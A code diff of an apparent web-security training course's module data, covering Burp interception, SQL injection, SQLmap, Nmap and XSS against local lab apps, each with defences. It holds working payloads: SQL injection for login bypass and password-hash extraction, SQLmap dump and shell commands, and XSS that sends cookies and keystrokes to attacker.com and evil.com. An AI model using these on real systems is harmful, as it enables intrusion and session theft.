@@ -63,173 +63,13 @@ const LI = {
 const MODULES = [
 
 // ─────────────────────────────────────────────────────────────────────────────
-// MODULE 1: Burp Suite Proxy Interception
+// RED 01: Nmap — Network Scanning & Enumeration
 // ─────────────────────────────────────────────────────────────────────────────
 {
-  id: 'burp-proxy', num: '01', short: 'burp',
-  title: 'Burp Suite Proxy Interception',
-  subtitle: 'Learn how web proxies capture, inspect, and modify HTTP traffic between your browser and a target application.',
-  tag: 'Module 1 — Proxy Fundamentals',
-
-  concept: [
-    `Every time you visit a website, your browser sends an <strong>HTTP request</strong> to a server, which replies with an <strong>HTTP response</strong>. Normally this exchange is invisible — it happens in milliseconds behind the scenes.`,
-    `A <strong>web proxy</strong> is software that sits <em>between</em> your browser and the server. It intercepts every request and response, letting you read, modify, or replay them before they reach their destination.`,
-    `<strong>Burp Suite</strong> is the industry-standard web proxy for penetration testers. When you enable its <strong>Intercept</strong> feature, every outbound request from Burp's built-in Chromium browser is paused and displayed in a raw text editor. You can change parameters, headers, or the body — then forward the modified request to the server.`,
-    `This gives you complete control over the conversation between client and server, which is the foundation of almost every web application attack.`
-  ],
-
-  analogy: { emoji: '📬', text: `Imagine a postal inspector stationed at a sorting facility. Every letter (HTTP request) leaving your house passes through the inspector's desk. They can open the envelope, read the contents, change the delivery address, swap the letter inside, or simply let it pass through. The recipient (server) has no idea the letter was ever touched. That inspector is your Burp Suite proxy.` },
-
-  steps: [
-    { title: 'Start Burp Suite and Open the Built-in Browser', desc: 'Launch Burp Suite Community Edition. Navigate to the <strong>Proxy</strong> tab and click <strong>"Open browser"</strong>. This opens a Chromium instance pre-configured to route all traffic through Burp — no manual proxy settings needed.', code: null },
-    { title: 'Enable Intercept Mode', desc: 'In the <strong>Proxy → Intercept</strong> sub-tab, click the toggle so it reads <strong>"Intercept is on"</strong>. From this moment, every HTTP request from the built-in browser will be paused and shown to you.', code: null },
-    { title: 'Browse to the Juice Shop Target', desc: 'In Burp\'s built-in browser, navigate to the local Juice Shop instance. The page will appear to hang because Burp is holding the request.', code: { lang: 'url', text: 'http://localhost:3000' } },
-    { title: 'Inspect the Intercepted Request', desc: 'Switch back to the Burp window. You\'ll see the raw GET request in the Intercept panel. Study the structure — the request line, Host header, User-Agent, cookies, and any query parameters.', code: { lang: 'http', text: 'GET / HTTP/1.1\nHost: localhost:3000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nAccept-Language: en-US,en;q=0.9\nConnection: keep-alive' } },
-    { title: 'Forward and Observe the Response', desc: 'Click <strong>"Forward"</strong> in Burp to send the request to the server. The Juice Shop homepage will now load. Check the <strong>HTTP history</strong> sub-tab to see both the request and the server\'s response, including status code, headers, and body.', code: null },
-    { title: 'Modify a Request In-Flight', desc: 'Navigate to the Juice Shop login page. When Burp intercepts the POST request, change a parameter value directly in the raw editor before forwarding it. This is the core skill you\'ll use in every subsequent module.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"modified_value"}' } },
-    { title: 'Abusing Client-Side Validation', desc: 'A common vulnerability is relying solely on the browser (client) for security checks. In Juice Shop, try giving a product a negative quantity or an unrealistic price. The browser UI might prevent you from typing "-1", but you can intercept the API request in Burp and change the quantity to a negative number before it hits the server.', code: { lang: 'json', text: '{"ProductId": 1, "quantity": -10}' } },
-    { title: 'Discover the Hidden Score Board', desc: 'Juice Shop has a hidden "Score Board" tracking your hacking progress. The link is hidden in the UI, but by intercepting the main JavaScript bundle request and looking at the response (or using Repeater), you can find the path. Then simply browse to it.', code: { lang: 'url', text: 'http://localhost:3000/#/score-board' } },
-    { title: 'Using Burp Repeater', desc: 'Find any request in your <strong>HTTP history</strong>, right-click, and select <strong>Send to Repeater</strong>. Repeater allows you to replay the exact same request hundreds of times, tweaking one parameter at a time and instantly seeing the response without clicking through the UI again.', code: null }
-  ],
-
-  defense: [
-    { title: 'HTTPS / TLS Encryption', desc: 'Encrypt all traffic with TLS certificates. Even if intercepted on the network, the data is unreadable without the private key. Always redirect HTTP to HTTPS.' },
-    { title: 'HTTP Strict Transport Security (HSTS)', desc: 'Set the <code>Strict-Transport-Security</code> header so browsers refuse to connect over plain HTTP after the first visit.' },
-    { title: 'Certificate Pinning', desc: 'Mobile apps can pin the server\'s exact certificate, rejecting proxy certificates like Burp\'s. This prevents MITM on production mobile traffic.' },
-    { title: 'Input Validation on the Server', desc: 'Never trust client-side data. Validate and sanitize every parameter on the server — a proxy can bypass any client-side checks (like min/max length, regex, or dropdown restrictions).' }
-  ],
-
-  payloads: { headers: ['Item', 'Description', 'Example'], rows: [
-    ['GET',           'Retrieves a resource from the server',                      'GET /api/users HTTP/1.1'],
-    ['POST',          'Sends data to the server (login forms, file uploads)',       'POST /rest/user/login HTTP/1.1'],
-    ['PUT',           'Replaces an entire resource on the server',                 'PUT /api/users/1 HTTP/1.1'],
-    ['DELETE',        'Removes a resource from the server',                        'DELETE /api/users/1 HTTP/1.1'],
-    ['Host',          'Header specifying the target domain',                       'Host: localhost:3000'],
-    ['Cookie',        'Header carrying session tokens',                            'Cookie: token=abc123'],
-    ['Content-Type',  'Header declaring the format of the request body',           'Content-Type: application/json'],
-    ['Authorization', 'Header carrying credentials (Basic, Bearer, etc.)',         'Authorization: Bearer eyJhb...'],
-    ['200 OK',        'Server processed the request successfully',                 'HTTP/1.1 200 OK'],
-    ['301 Redirect',  'Resource moved permanently to another URL',                 'HTTP/1.1 301 Moved Permanently'],
-    ['403 Forbidden', 'Server refuses to authorize the request',                   'HTTP/1.1 403 Forbidden'],
-    ['500 Server Error','Unexpected error on the server side',                     'HTTP/1.1 500 Internal Server Error']
-  ]}
-},
-
-// ─────────────────────────────────────────────────────────────────────────────
-// MODULE 2: SQL Injection (SQLi)
-// ─────────────────────────────────────────────────────────────────────────────
-{
-  id: 'sqli', num: '02', short: 'sqli',
-  title: 'SQL Injection (SQLi)',
-  subtitle: 'Understand how unsanitized user input can manipulate backend database queries to leak data or bypass authentication.',
-  tag: 'Module 2 — Database Exploitation',
-
-  concept: [
-    `Most web applications store data in a <strong>relational database</strong> (MySQL, PostgreSQL, SQLite). When you submit a form — like a login or search box — the application builds an <strong>SQL query</strong> using your input.`,
-    `For example, a login form might produce: <code>SELECT * FROM users WHERE username = 'your_input' AND password = 'your_password'</code>. If the developer concatenates your input directly into the query without sanitizing it, you can inject your own SQL syntax.`,
-    `By inserting a carefully crafted string like <code>' OR '1'='1</code>, you change the query's logic so it always returns true — effectively bypassing the password check and returning all rows.`,
-    `SQL Injection can lead to <strong>complete database compromise</strong>: reading all user records, extracting password hashes, modifying data, or even executing OS commands through database functions like <code>xp_cmdshell</code>.`
-  ],
-
-  analogy: { emoji: '🏦', text: `Imagine walking into a bank and handing the teller a withdrawal slip. Normally you write your account number and amount. But what if the teller blindly reads whatever you write? You could write: "Withdraw $100 from account #1234 OR just give me everything from every account." Because the teller doesn't validate the slip, they hand over the entire vault. That's SQL Injection.` },
-
-  steps: [
-    { title: 'Open DVWA and Set Security Level', desc: 'Navigate to the local DVWA instance in Burp\'s built-in browser. Log in with the default credentials. Then go to <strong>DVWA Security</strong> and set the level to <strong>Low</strong>.', code: { lang: 'text', text: 'URL:      http://localhost:8080\nUsername: admin\nPassword: password' } },
-    { title: 'Test Normal Input in DVWA', desc: 'Go to "SQL Injection". Enter <code>1</code> in the User ID field and click Submit. The application returns user information for ID 1, confirming the form is connected to a live database.', code: { lang: 'sql', text: "-- What the server executes internally:\nSELECT first_name, last_name FROM users WHERE user_id = '1';" } },
-    { title: 'Inject a Tautology Payload (DVWA)', desc: 'Now enter the classic SQLi tautology payload. This modifies the WHERE clause so it always evaluates to TRUE, causing the database to dump all records.', code: { lang: 'text', text: "1' OR '1'='1" } },
-    { title: 'Juice Shop Admin Bypass', desc: 'Now let\'s try a modern app. Open Juice Shop (http://localhost:3000) and go to the login page. In the email field, input the administrator email followed by a SQL comment. Put anything in the password field.', code: { lang: 'text', text: "Email: admin@juice-sh.op' --\nPassword: a" } },
-    { title: 'Understand the Juice Shop Bypass', desc: 'By adding the comment characters (`--`), you tell the SQLite database engine to ignore the rest of the query. The password check is never executed!', code: { lang: 'sql', text: "-- Internal Query becomes:\nSELECT * FROM Users WHERE email = 'admin@juice-sh.op' --' AND password = 'a';" } },
-    { title: 'Error-Based SQLi', desc: 'Sometimes you don\'t get a clean dump, but the server spits out database errors. Try placing a single quote (`\'`) into the Juice Shop search bar or a product review. If the page returns a stack trace mentioning "SQLITE_ERROR", you have confirmed it is vulnerable.', code: { lang: 'text', text: "Search: apple'" } },
-    { title: 'Extract Database Version with UNION SELECT', desc: 'Back in DVWA, use a UNION-based injection to extract the database version. First determine the column count (DVWA uses 2 columns), then inject:', code: { lang: 'text', text: "1' UNION SELECT user(), version()-- -" } },
-    { title: 'Enumerate All Tables', desc: 'Once you know the column count, you can enumerate every table in the database by querying <code>information_schema</code>:', code: { lang: 'text', text: "1' UNION SELECT table_name, table_schema FROM information_schema.tables-- -" } },
-    { title: 'Extract Passwords', desc: 'Now target the users table to extract password hashes. These can later be cracked offline with tools like John the Ripper or hashcat:', code: { lang: 'text', text: "1' UNION SELECT user, password FROM users-- -" } }
-  ],
-
-  defense: [
-    { title: 'Parameterized Queries / Prepared Statements', desc: 'The #1 defense. Use placeholders (<code>?</code> or <code>:name</code>) instead of string concatenation. The database driver treats user input as data, never as SQL syntax. Example in PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);</code>' },
-    { title: 'Input Validation & Whitelisting', desc: 'If a field should be a number, cast it to an integer. If it\'s a name, allow only alphanumeric characters. Reject anything that doesn\'t match the expected pattern.' },
-    { title: 'Least-Privilege Database Accounts', desc: 'The web application\'s database user should have only SELECT/INSERT/UPDATE on the tables it needs — never DBA or root privileges. This limits the damage even if SQLi succeeds.' },
-    { title: 'Web Application Firewall (WAF)', desc: 'Deploy a WAF (e.g., ModSecurity) to detect and block common SQLi patterns in real time. Not a replacement for secure code, but a valuable layer of defense.' },
-    { title: 'Generic Error Handling', desc: 'Never expose raw database errors to the user. Use generic error pages. Detailed SQL error messages reveal table names, column types, and query structure to attackers.' }
-  ],
-
-  payloads: { headers: ['Payload', 'Purpose', 'Risk'], rows: [
-    ["' OR '1'='1",                          'Tautology — bypasses WHERE clause, returns all rows',       'High'],
-    ["' OR '1'='1'-- -",                     'Tautology with comment — ignores remaining SQL',            'High'],
-    ["' UNION SELECT null,null-- -",         'Column count detection for UNION-based injection',           'Medium'],
-    ["' UNION SELECT user(),version()-- -",  'Extracts current DB user and version string',               'High'],
-    ["' UNION SELECT table_name,null FROM information_schema.tables-- -", 'Enumerates all table names',   'High'],
-    ["' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -", 'Extracts column names from target table', 'High'],
-    ["' AND 1=1-- -",                        'Boolean-based blind test — page normal if true',             'Medium'],
-    ["' AND 1=2-- -",                        'Boolean-based blind test — page changes if false',           'Medium'],
-    ["' AND SLEEP(5)-- -",                   'Time-based blind test — delays response by 5 seconds',       'Medium'],
-    ["admin@juice-sh.op'--",                 'Juice Shop Auth bypass — SQLite comment syntax',             'High'],
-    ["id=1'+OR+'1'='1&Submit=Submit",        'URL-encoded tautology for Burp Repeater (DVWA)',             'High']
-  ]}
-},
-
-// ─────────────────────────────────────────────────────────────────────────────
-// MODULE 3: SQLmap — Automated SQL Injection
-// ─────────────────────────────────────────────────────────────────────────────
-{
-  id: 'sqlmap', num: '03', short: 'sqlmap',
-  title: 'SQLmap — Automated SQL Injection',
-  subtitle: 'After understanding manual SQLi, learn how SQLmap automates detection, exploitation, and full database extraction.',
-  tag: 'Module 3 — Automation & Tooling',
-
-  concept: [
-    `<strong>SQLmap</strong> is an open-source penetration testing tool that automates the entire SQL Injection lifecycle — detection, exploitation, and data extraction. It is pre-installed on Kali Linux.`,
-    `It supports all major injection techniques: <strong>boolean-based blind</strong>, <strong>time-based blind</strong>, <strong>error-based</strong>, <strong>UNION-based</strong>, and <strong>stacked queries</strong>. SQLmap automatically fingerprints the database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and adjusts its payloads accordingly.`,
-    `<strong>Why use it after learning manual SQLi?</strong> Manual injection teaches you the underlying mechanics — you understand <em>why</em> things work. SQLmap then lets you scale that knowledge efficiently: it tests hundreds of payloads in seconds, handles encoding/escaping edge cases, and can dump entire databases automatically.`,
-    `SQLmap can also read/write files on the server filesystem, execute OS commands (if the DB user has sufficient privileges), and even spawn an interactive shell — making it one of the most powerful tools in a pentester's toolkit.`
-  ],
-
-  analogy: { emoji: '🤖', text: `You've just learned to pick a single lock by hand — you understand how the pins work, how tension wrenches apply pressure, and how to feel for the click. SQLmap is like a robotic lockpicking machine that can test every pin combination across every lock in the building in minutes. It uses the same techniques you learned by hand, but at machine speed. You still need to understand the fundamentals to interpret results and troubleshoot failures.` },
-
-  steps: [
-    { title: 'Identify the Target URL', desc: 'First, use Burp Suite (Module 1) to identify a URL with a parameter you suspect is vulnerable. For DVWA\'s SQLi page, the URL looks like this:', code: { lang: 'text', text: 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' } },
-    { title: 'Run a Basic SQLmap Scan (DVWA)', desc: 'Open a terminal in Kali Linux. Pass the target URL to SQLmap with the <code>-u</code> flag. Include the session cookie so SQLmap is authenticated. SQLmap will test the <code>id</code> parameter for injection vulnerabilities.', code: { lang: 'bash', text: 'sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=your_session_id; security=low"' } },
-    { title: 'Automating JSON APIs (Juice Shop)', desc: 'Juice Shop uses JSON payloads, not standard form fields. Using `-u` is tedious for JSON. Instead, intercept the login request in Burp Suite, right-click, and select "Save item" as `request.txt`.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"test"}' } },
-    { title: 'Run SQLmap with a Burp Request', desc: 'Use the `-r` flag to point SQLmap to the saved file. SQLmap will automatically parse the headers, URL, and the JSON body, and start testing every JSON value.', code: { lang: 'bash', text: 'sqlmap -r request.txt --batch' } },
-    { title: 'Enumerate All Databases', desc: 'Once SQLmap confirms the injection point, use <code>--dbs</code> to list every database on the server:', code: { lang: 'bash', text: 'sqlmap -r request.txt --dbs' } },
-    { title: 'Enumerate Tables in a Database', desc: 'Pick a database from the results (e.g., <code>dvwa</code> or SQLite for Juice Shop) and list all its tables with <code>-D</code> and <code>--tables</code>:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa --tables' } },
-    { title: 'Dump the Data', desc: 'Extract the actual data from the columns you care about. SQLmap will even attempt to crack password hashes automatically using a dictionary attack:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa -T users -C user,password --dump' } },
-    { title: 'Using Tamper Scripts', desc: 'Web Application Firewalls (WAFs) often block basic SQLi syntax (like blocking spaces). SQLmap has "tamper scripts" to obfuscate payloads. Use `--tamper=space2comment` to replace spaces with `/**/` comments to bypass basic WAFs.', code: { lang: 'bash', text: 'sqlmap -r request.txt --tamper=space2comment --level=3 --risk=2' } }
-  ],
-
-  defense: [
-    { title: 'Same Defenses as Manual SQLi', desc: 'All defenses from Module 2 apply — parameterized queries, input validation, least-privilege DB accounts, and WAFs are your primary protections.' },
-    { title: 'Rate Limiting', desc: 'SQLmap sends many rapid requests. Rate limiting and anomaly detection can flag or block automated scanning patterns.' },
-    { title: 'Intrusion Detection Systems (IDS)', desc: 'Tools like Snort or Suricata can detect SQLmap\'s signature patterns (user-agent strings, payload patterns) and alert security teams.' },
-    { title: 'Disable Detailed Error Messages', desc: 'Error-based SQLi relies on the server exposing database errors. Configure the application to show generic error pages in production.' }
-  ],
-
-  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
-    ['-u URL',         'Target URL with injectable parameter',              'sqlmap -u "http://target/page?id=1"'],
-    ['-r FILE',        'Use a saved HTTP request file from Burp Suite',     'sqlmap -r request.txt'],
-    ['--dbs',          'Enumerate all databases on the server',             'sqlmap -u URL --dbs'],
-    ['-D DB --tables', 'List all tables in a specific database',            'sqlmap -u URL -D dvwa --tables'],
-    ['-T TBL --columns','List columns in a specific table',                 'sqlmap -u URL -D dvwa -T users --columns'],
-    ['--dump',         'Extract (dump) data from specified table/columns',  'sqlmap -u URL -D dvwa -T users --dump'],
-    ['--batch',        'Non-interactive mode (auto-answers all prompts)',   'sqlmap -r req.txt --batch'],
-    ['--level=N',      'Test thoroughness (1-5). Higher = more params',    'sqlmap -u URL --level=5'],
-    ['--risk=N',       'Payload aggressiveness (1-3). Higher = riskier',   'sqlmap -u URL --risk=3'],
-    ['--forms',        'Auto-detect and test HTML forms on a page',        'sqlmap -u "http://target/login" --forms'],
-    ['--os-shell',     'Attempt to spawn an interactive OS shell',          'sqlmap -u URL --os-shell'],
-    ['--cookie=C',     'Set HTTP Cookie header for authentication',         'sqlmap -u URL --cookie="PHPSESSID=abc"'],
-    ['--threads=N',    'Parallelise requests (default 1, max 10)',         'sqlmap -u URL --threads=10'],
-    ['--tamper=SCRIPT','Apply payload tampering scripts to bypass WAFs',    'sqlmap -u URL --tamper=space2comment']
-  ]}
-},
-
-// ─────────────────────────────────────────────────────────────────────────────
-// MODULE 4: Nmap — Network Scanning & Enumeration
-// ─────────────────────────────────────────────────────────────────────────────
-{
-  id: 'nmap', num: '04', short: 'nmap',
+  id: 'nmap', track: 'red', num: '01', short: 'nmap',
   title: 'Nmap — Network Scanning & Enumeration',
   subtitle: 'Master the most widely-used network scanner. Learn every major flag and scan technique for discovering hosts, open ports, and running services.',
-  tag: 'Module 4 — Reconnaissance',
+  tag: 'Red 01 — Reconnaissance',
 
   concept: [
     `<strong>Nmap (Network Mapper)</strong> is the de facto standard tool for network discovery and security auditing. It is pre-installed on Kali Linux and available for all major operating systems.`,
@@ -282,13 +122,217 @@ const MODULES = [
 },
 
 // ─────────────────────────────────────────────────────────────────────────────
-// MODULE 5: Brute Force with Hydra
+// RED 02: SQL Injection (SQLi)
 // ─────────────────────────────────────────────────────────────────────────────
 {
-  id: 'hydra', num: '05', short: 'hydra',
+  id: 'sqli', track: 'red', num: '02', short: 'sqli',
+  title: 'SQL Injection (SQLi)',
+  subtitle: 'Understand how unsanitized user input can manipulate backend database queries to leak data or bypass authentication.',
+  tag: 'Red 02 — Database Exploitation',
+
+  concept: [
+    `Most web applications store data in a <strong>relational database</strong> (MySQL, PostgreSQL, SQLite). When you submit a form — like a login or search box — the application builds an <strong>SQL query</strong> using your input.`,
+    `For example, a login form might produce: <code>SELECT * FROM users WHERE username = 'your_input' AND password = 'your_password'</code>. If the developer concatenates your input directly into the query without sanitizing it, you can inject your own SQL syntax.`,
+    `By inserting a carefully crafted string like <code>' OR '1'='1</code>, you change the query's logic so it always returns true — effectively bypassing the password check and returning all rows.`,
+    `SQL Injection can lead to <strong>complete database compromise</strong>: reading all user records, extracting password hashes, modifying data, or even executing OS commands through database functions like <code>xp_cmdshell</code>.`
+  ],
+
+  analogy: { emoji: '🏦', text: `Imagine walking into a bank and handing the teller a withdrawal slip. Normally you write your account number and amount. But what if the teller blindly reads whatever you write? You could write: "Withdraw $100 from account #1234 OR just give me everything from every account." Because the teller doesn't validate the slip, they hand over the entire vault. That's SQL Injection.` },
+
+  steps: [
+    { title: 'Open DVWA and Set Security Level', desc: 'Navigate to the local DVWA instance in Burp\'s built-in browser. Log in with the default credentials. Then go to <strong>DVWA Security</strong> and set the level to <strong>Low</strong>.', code: { lang: 'text', text: 'URL:      http://localhost:8080\nUsername: admin\nPassword: password' } },
+    { title: 'Test Normal Input in DVWA', desc: 'Go to "SQL Injection". Enter <code>1</code> in the User ID field and click Submit. The application returns user information for ID 1, confirming the form is connected to a live database.', code: { lang: 'sql', text: "-- What the server executes internally:\nSELECT first_name, last_name FROM users WHERE user_id = '1';" } },
+    { title: 'Inject a Tautology Payload (DVWA)', desc: 'Now enter the classic SQLi tautology payload. This modifies the WHERE clause so it always evaluates to TRUE, causing the database to dump all records.', code: { lang: 'text', text: "1' OR '1'='1" } },
+    { title: 'Juice Shop Admin Bypass', desc: 'Now let\'s try a modern app. Open Juice Shop (http://localhost:3000) and go to the login page. In the email field, input the administrator email followed by a SQL comment. Put anything in the password field.', code: { lang: 'text', text: "Email: admin@juice-sh.op' --\nPassword: a" } },
+    { title: 'Understand the Juice Shop Bypass', desc: 'By adding the comment characters (`--`), you tell the SQLite database engine to ignore the rest of the query. The password check is never executed!', code: { lang: 'sql', text: "-- Internal Query becomes:\nSELECT * FROM Users WHERE email = 'admin@juice-sh.op' --' AND password = 'a';" } },
+    { title: 'Error-Based SQLi', desc: 'Sometimes you don\'t get a clean dump, but the server spits out database errors. Try placing a single quote (`\'`) into the Juice Shop search bar or a product review. If the page returns a stack trace mentioning "SQLITE_ERROR", you have confirmed it is vulnerable.', code: { lang: 'text', text: "Search: apple'" } },
+    { title: 'Extract Database Version with UNION SELECT', desc: 'Back in DVWA, use a UNION-based injection to extract the database version. First determine the column count (DVWA uses 2 columns), then inject:', code: { lang: 'text', text: "1' UNION SELECT user(), version()-- -" } },
+    { title: 'Enumerate All Tables', desc: 'Once you know the column count, you can enumerate every table in the database by querying <code>information_schema</code>:', code: { lang: 'text', text: "1' UNION SELECT table_name, table_schema FROM information_schema.tables-- -" } },
+    { title: 'Extract Passwords', desc: 'Now target the users table to extract password hashes. These can later be cracked offline with tools like John the Ripper or hashcat:', code: { lang: 'text', text: "1' UNION SELECT user, password FROM users-- -" } }
+  ],
+
+  defense: [
+    { title: 'Parameterized Queries / Prepared Statements', desc: 'The #1 defense. Use placeholders (<code>?</code> or <code>:name</code>) instead of string concatenation. The database driver treats user input as data, never as SQL syntax. Example in PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);</code>' },
+    { title: 'Input Validation & Whitelisting', desc: 'If a field should be a number, cast it to an integer. If it\'s a name, allow only alphanumeric characters. Reject anything that doesn\'t match the expected pattern.' },
+    { title: 'Least-Privilege Database Accounts', desc: 'The web application\'s database user should have only SELECT/INSERT/UPDATE on the tables it needs — never DBA or root privileges. This limits the damage even if SQLi succeeds.' },
+    { title: 'Web Application Firewall (WAF)', desc: 'Deploy a WAF (e.g., ModSecurity) to detect and block common SQLi patterns in real time. Not a replacement for secure code, but a valuable layer of defense.' },
+    { title: 'Generic Error Handling', desc: 'Never expose raw database errors to the user. Use generic error pages. Detailed SQL error messages reveal table names, column types, and query structure to attackers.' }
+  ],
+
+  payloads: { headers: ['Payload', 'Purpose', 'Risk'], rows: [
+    ["' OR '1'='1",                          'Tautology — bypasses WHERE clause, returns all rows',       'High'],
+    ["' OR '1'='1'-- -",                     'Tautology with comment — ignores remaining SQL',            'High'],
+    ["' UNION SELECT null,null-- -",         'Column count detection for UNION-based injection',           'Medium'],
+    ["' UNION SELECT user(),version()-- -",  'Extracts current DB user and version string',               'High'],
+    ["' UNION SELECT table_name,null FROM information_schema.tables-- -", 'Enumerates all table names',   'High'],
+    ["' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -", 'Extracts column names from target table', 'High'],
+    ["' AND 1=1-- -",                        'Boolean-based blind test — page normal if true',             'Medium'],
+    ["' AND 1=2-- -",                        'Boolean-based blind test — page changes if false',           'Medium'],
+    ["' AND SLEEP(5)-- -",                   'Time-based blind test — delays response by 5 seconds',       'Medium'],
+    ["admin@juice-sh.op'--",                 'Juice Shop Auth bypass — SQLite comment syntax',             'High'],
+    ["id=1'+OR+'1'='1&Submit=Submit",        'URL-encoded tautology for Burp Repeater (DVWA)',             'High']
+  ]}
+},
+
+// ─────────────────────────────────────────────────────────────────────────────
+// RED 03: Cross-Site Scripting (XSS)
+// ─────────────────────────────────────────────────────────────────────────────
+{
+  id: 'xss', track: 'red', num: '03', short: 'xss',
+  title: 'Cross-Site Scripting (XSS)',
+  subtitle: 'Learn how injecting malicious client-side scripts can hijack user sessions and manipulate web pages.',
+  tag: 'Red 03 — Client-Side Attacks',
+
+  concept: [
+    '<strong>Cross-Site Scripting (XSS)</strong> occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious JavaScript in the victim\'s browser.',
+    '<strong>Reflected XSS</strong> happens when user input is immediately returned (reflected) by the web application in an error message, search result, or any other response. The payload is typically delivered via a crafted link.',
+    '<strong>Stored XSS</strong> (Persistent) is more dangerous. The malicious script is saved on the target server (e.g., in a database via a comment or profile field) and executed every time a user views the infected page.',
+    '<strong>DOM-based XSS</strong> occurs entirely in the browser when client-side JavaScript takes data from an attacker-controllable source (like the URL hash) and passes it to a dangerous sink (like <code>innerHTML</code> or <code>eval()</code>).'
+  ],
+
+  analogy: { emoji: '\uD83C\uDFAD', text: 'Imagine putting up a poster on a community noticeboard. Normally, you just write text. But if the noticeboard doesn\'t restrict what you pin up, you could pin a magical set of instructions that hypnotize anyone who reads them. When a victim looks at the board, they unknowingly execute your instructions \u2014 perhaps handing over their wallet. XSS is injecting those magical instructions (JavaScript) into a webpage.' },
+
+  steps: [
+    { title: 'Reflected XSS via Search', desc: 'In Juice Shop, the search bar reflects your input directly into the page. Try searching for an HTML tag like <code>&lt;h1&gt;Test&lt;/h1&gt;</code>. If the text renders as a heading, HTML is being interpreted. Now try an iframe payload:', code: { lang: 'html', text: '<iframe src="javascript:alert(\'xss\')">' } },
+    { title: 'DOM XSS via URL Hash', desc: 'Juice Shop\'s Angular frontend processes the URL hash client-side. If this data is unsafely rendered into the DOM, it creates a DOM XSS vector. Try navigating to this URL directly:', code: { lang: 'url', text: 'http://localhost:3000/#/search?q=<iframe src="javascript:alert(\'xss\')">' } },
+    { title: 'Stored XSS via Feedback', desc: 'Navigate to the Customer Feedback section. Enter an XSS payload in the comment field. The script is saved to the database and will trigger whenever the feedback is viewed (e.g., by an admin in the Administration panel).', code: { lang: 'html', text: '<script>alert("Stored XSS via Feedback!")</script>' } },
+    { title: 'Stealing Cookies', desc: 'The most common real-world XSS goal is stealing session cookies. An attacker writes a script that reads <code>document.cookie</code> and sends it to their own server, effectively hijacking the victim\'s session.', code: { lang: 'html', text: '<script>fetch("http://attacker.com/steal?cookie=" + btoa(document.cookie))</script>' } },
+    { title: 'Keylogging via XSS', desc: 'Advanced XSS payloads can silently capture keystrokes on the infected page. The attacker injects an event listener that forwards every key pressed to their server.', code: { lang: 'javascript', text: 'document.addEventListener("keypress", function(e) {\\n  fetch("http://attacker.com/log?k=" + e.key);\\n});' } }
+  ],
+
+  defense: [
+    { title: 'Context-Aware Output Encoding', desc: 'Never trust user input. Before rendering data in the browser, encode it according to where it will be placed (HTML body, attribute, JavaScript variable). Use framework features like React or Angular that auto-escape by default.' },
+    { title: 'Content Security Policy (CSP)', desc: 'A strict CSP prevents the browser from executing inline scripts and restricts where external scripts can be loaded from. It acts as a defense-in-depth layer against XSS.' },
+    { title: 'HttpOnly Cookies', desc: 'Set the <code>HttpOnly</code> flag on session cookies. This prevents client-side JavaScript (and therefore XSS attacks) from accessing the cookie.' },
+    { title: 'Sanitization', desc: 'If you must allow users to submit rich text (HTML), use a robust sanitization library like DOMPurify to strip out dangerous tags and attributes (like <code>&lt;script&gt;</code> or <code>onerror</code>).' }
+  ],
+
+  payloads: { headers: ['Payload', 'Type / Purpose', 'Description'], rows: [
+    ['&lt;script&gt;alert(1)&lt;/script&gt;',             'Basic',        'The classic proof of concept. Executes a simple alert box.'],
+    ['&lt;img src=x onerror=alert(1)&gt;',                'Image Vector', 'Executes JavaScript when the browser fails to load the fake image source.'],
+    ['&lt;iframe src="javascript:alert(1)"&gt;',           'Iframe',       'Executes script within an iframe. Often bypasses basic regex filters.'],
+    ['&lt;svg onload=alert(1)&gt;',                       'SVG Vector',   'Executes script when the SVG element finishes loading.'],
+    ['"&gt;&lt;script&gt;alert(1)&lt;/script&gt;',        'Break Out',    'Closes an existing HTML attribute/tag before injecting the payload.'],
+    ['javascript:alert(1)',                                'URI Scheme',   'Used in href or src attributes that expect a URL.'],
+    ['&lt;script&gt;fetch("http://evil.com/?c="+document.cookie)&lt;/script&gt;', 'Exfiltration', 'Steals the session cookie and sends it to the attacker.']
+  ]}
+},
+
+// ─────────────────────────────────────────────────────────────────────────────
+// RED 04: SQLmap — Automated SQL Injection
+// ─────────────────────────────────────────────────────────────────────────────
+{
+  id: 'sqlmap', track: 'red', num: '04', short: 'sqlmap',
+  title: 'SQLmap — Automated SQL Injection',
+  subtitle: 'After understanding manual SQLi, learn how SQLmap automates detection, exploitation, and full database extraction.',
+  tag: 'Red 04 — Automation & Tooling',
+
+  concept: [
+    `<strong>SQLmap</strong> is an open-source penetration testing tool that automates the entire SQL Injection lifecycle — detection, exploitation, and data extraction. It is pre-installed on Kali Linux.`,
+    `It supports all major injection techniques: <strong>boolean-based blind</strong>, <strong>time-based blind</strong>, <strong>error-based</strong>, <strong>UNION-based</strong>, and <strong>stacked queries</strong>. SQLmap automatically fingerprints the database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and adjusts its payloads accordingly.`,
+    `<strong>Why use it after learning manual SQLi?</strong> Manual injection teaches you the underlying mechanics — you understand <em>why</em> things work. SQLmap then lets you scale that knowledge efficiently: it tests hundreds of payloads in seconds, handles encoding/escaping edge cases, and can dump entire databases automatically.`,
+    `SQLmap can also read/write files on the server filesystem, execute OS commands (if the DB user has sufficient privileges), and even spawn an interactive shell — making it one of the most powerful tools in a pentester's toolkit.`
+  ],
+
